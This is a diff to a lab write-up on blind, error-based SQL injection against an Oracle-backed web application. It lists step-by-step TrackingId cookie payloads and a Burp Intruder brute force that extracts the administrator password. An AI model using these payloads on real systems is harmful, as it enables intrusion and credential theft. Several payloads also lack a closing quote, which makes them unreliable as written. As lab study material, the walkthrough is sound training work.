@@ -8,8 +8,37 @@ Given:
 -The database contains a different table called users, with columns called username and password.
 -The application does not respond any differently based on whether the query returns any rows.
 -If the SQL query causes an error, then the application returns a custom error message.
+-Password contains lowercase alphanumeric values
 
-Exploitation Steps:
-1. Connect Burp Suite with browser and go to My Account page.
-2. Send this request to Burps's Repeater for manipulating it.
-3. Manipulate the TrackingID to check wheather error coe
+Analysis & Exploitation:
+1. Connect Burp Suite with Web Browser and access the lab. In the lab, go to My Account page.
+2. Now search this request in Burp's Proxy and send it to Repeater.
+3. Inside Repeater perform following analysis:
+  a. First we verify the error message conditon:
+    - TrackingId=xyz'  ( error message )
+    - TrackingId=xyz'' ( no error meesage )
+    Hence, error message occurs in all invalid queries but we might execute vulnerable quereies between quotes.
+  b. Test the vulnerable perimeter:
+    - TrackingId=xyz'||(SELECT '')||'  (error message, might have a different database)
+    - TrackingId=xyz'||(SELECT '' FROM dual)||' ( no error, confirms oracle database )
+  c. Now we will be check table and username:
+    - '||(SELECT '' FROM users WHERE ROWNUM = 1)||'                  ( no error, confirming users table )
+    - '||(SELECT '' FROM users WHERE username='administrator')||'    ( no error, confirming administrator username )
+  d. Now we use a test condition to check cases:
+    - '||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator)||'
+      Here since the condition 1=1 is true we move to 1/0 which causes internal server error.
+    - '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator)||'
+      Here the condition is false so 1/0 does not run so no error occurs. 
+4. So after analyzing this thing we will use the above test case to determin the length of password using following query:
+    -'||(SELECT CASE WHEN LENGTH(password)=x THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator)||'
+      Where we put differnt values of x like 1,2,3,........... to find the length of password.
+      ON x=20 we get an internal server error that means the test condition was true. That means password lenght is 20.
+5. Now we send this request to Intruder. There we modify the query for determining password values for different positions:
+    -'||(SELECT CASE WHEN SUBSTR(password,§1§,1)=§a§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator)||'
+6. We will use Cluster-Bomb Attack to test password values at each position.
+7. In the payload 1, choose number in range 1 to 20.
+8. In the payload a, choose lowercase alphnumericals.
+9. Now go to the settings and in grep extract, add text "Internal Server Error" and start the attack.
+10. In the results we can see 20 results containing 2 in Internal Server Error column which shows correct value for that position.
+11. We figure out the password from the attack resutls and use it to log in as an administrator.
+
